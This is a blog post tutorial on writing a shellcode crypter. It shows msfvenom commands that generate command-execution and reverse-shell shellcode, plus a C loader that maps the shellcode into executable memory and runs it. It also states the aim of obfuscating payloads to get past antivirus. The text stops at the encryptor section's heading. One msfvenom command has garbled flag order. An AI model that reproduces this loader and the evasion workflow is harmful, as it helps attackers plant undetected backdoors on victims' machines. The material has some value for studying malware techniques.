---
layout: post
title:  "Writing a Custom Shellcoder Encrypter - First Post by Zero++;" 
---

In this blogpost we will write an custom Shellcode Cryptor in go. 

## But what exactly is Shellcode?
Shellcode is a combination of binary instruction that will be executed on cpu.
Shellcode can be used for everything, to spawn a reverse shell, to execute a program, to obtain a file descriptor or whatever.
We 1337-heckers use Shellcode because its independent, minimalistic, easy to hide and obfuscate and also perfect to inject into processes.
Shellcode can be written by Hand which is very difficult and not recommended by me, i would recommend to extract Shellcode from Assembly or any compiled programs.  

## Requirements to follow this Blog
This tutorial is for Linux but the Shellcode encoding works same on any Operating System, only the process of execution is different.
In this tutorial we will use Metasploit's msfvenom to generate the Shellcode, C and mmap (a Linux systemcall) to make the Shellcode executable.
Shellcode itself is not Executable, data has to be in a specific file format like ELF (used by Unix and Linux for binaries, shared libraries etc.) or the more famous one PE (Portable Executable the file format used by windows for .exe and .dll files) to be executable. Thats why we will use C to make our Shellcode executable inside our program. I highly recommend to use gcc (the gnu compiler collection) or clang to compile your C Code. The go toolchain is also required.


## Generating our first Shellcode  
In this blogpost we will use ```/tmp/blog/``` as workspace.
We will generate Unencrypted Shellcode in C format (later we will use the raw format).
The Shellcode we will generate with msfvenom will execute the "ls" program.
The -b option is for avoiding bytes, in Shellcoding on **x86** we always have to avoid 
NULL-BYTES because it will make our Shellcode stop working (i will not go into depth here).
With specifying ``` -f c ``` we use the C format, it will output a C-bytearray which is just a normal array and can easily just get copied and pasted.  

```bash
# create and navigate to workspace 
$ sudo su
$ mkdir /tmp/blog
$ cd /tmp/blog
# generate and show Shellcode 
$ msfvenom -p linux/x86/exec CMD="ls" -f -b "\x00" c -o raw.txt 
$ cat raw.txt

```
# Executing the Shellcode in C
Now copy the output of ```cat raw.txt``` into the C code down below here and replace your output with the "bytes" array", the has to be renamed to "bytes".
After its done it should look like this.

```c
#include <stdio.h>    /* standard input/output */
#include <string.h>   /* used for memcpy */
#include <sys/mman.h> /* header for mmap syscall and flags */

unsigned char bytes[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73"
"\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00"
"\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80";

int main() {
	/* allocate a memory map */
	void* region = mmap(NULL, 

			sizeof(bytes),
			PROT_WRITE | PROT_EXEC,
			MAP_ANONYMOUS | MAP_PRIVATE,
			-1,
			0);
	/* check for error */
	if(region == MAP_FAILED) {
		perror("mmap");
		return 1;
	}
	
	/* copy shellcode into allocated memory page*/
	memcpy(region, bytes, sizeof(bytes));
	
	/* debug message */
	printf("executing %d bytes shellcode using mmap system call\n", sizeof(bytes));

	/* executing the shellcode via function pointer */
	((int(*)())region)();
	
	/* deallocate the memory */
	munmap(region, sizeof(bytes));
	return 0;
}
```

## Notes and Compiling the Program
This blog is not a C course you already should be familiar with the C language.
I will compile the program with the following command 
```gcc -m32 file.c -o runme && ./runme```
The -m32 option stands basically for 32 bit make sure you have gcc-multilib installed to be able to use the 32-bit headers. After Compiling and 
executing the program we should get following output:
```bash
executing 39 bytes shellcode using mmap system call
file.c	raw.txt  runme
```
as we see the c code and the Shellcode execute "ls", thats why it listed the files down below there.

## Generating Reverse-Shell-Shellcode with msfvenom
Now we will generate Shellcode which will spawn a Reverse-Shell.
To run the Shellcode you have todo the same as before, just copy the output, paste, rename the array, compile and run.
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b "\x00" -f c -o raw.txt 
```
For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected as we see here.

![VirusTotal Screenshot](https://github.com/calloczero/calloczero.github.io/blob/main/_images/crop.png?raw=true)

# Writing an Encryptor to make an obfucate and outplaying Antivirus Software    


















